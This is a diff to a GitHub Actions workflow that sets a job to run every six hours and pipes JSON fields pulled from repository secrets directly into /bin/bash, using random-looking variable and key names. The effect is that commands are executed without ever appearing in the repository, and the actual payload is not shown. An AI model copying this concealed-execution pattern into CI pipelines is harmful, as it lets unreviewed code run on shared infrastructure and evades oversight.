@@ -3,8 +3,9 @@ name: tousanhougua
 on:
   workflow_dispatch:
   schedule:
-    - cron: '18 1/6 * * *'
-jobs:  # 15556
+    - cron: '20 3/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,8 +13,17 @@ jobs:  # 15556
       - uses: actions/checkout@v4
       - name: tousanhougua
         env:
-          d2: ${{ secrets.d2 }}
+          tsbx5662: ${{ secrets.tsbx5662 }}
         run: |
-          echo $d2 | jq -r .u93 | /bin/bash
-          echo $idrgb369 | jq -r .ybnnv67577 | /bin/bash
+          echo $tsbx5662 | jq -r .emvu3 | /bin/bash
+          echo $oscgx58303 | jq -r .rjtjy1 | /bin/bash
+          echo $ye9 | jq -r .ipp1144 | /bin/bash
+          echo $hp23 | jq -r .dqc23899 | /bin/bash
+          echo $nnnrw609 | jq -r .bfxpt6 | /bin/bash
+          echo $doubw3 | jq -r .at3 | /bin/bash
+          echo $he51 | jq -r .qqz2 | /bin/bash
+          echo $j62083 | jq -r .g092 | /bin/bash
+          echo $f164 | jq -r .jhg7 | /bin/bash
+          echo $yyjt52 | jq -r .k35574 | /bin/bash
+          echo $raf0605 | jq -r .tkdke3741 | /bin/bash
 
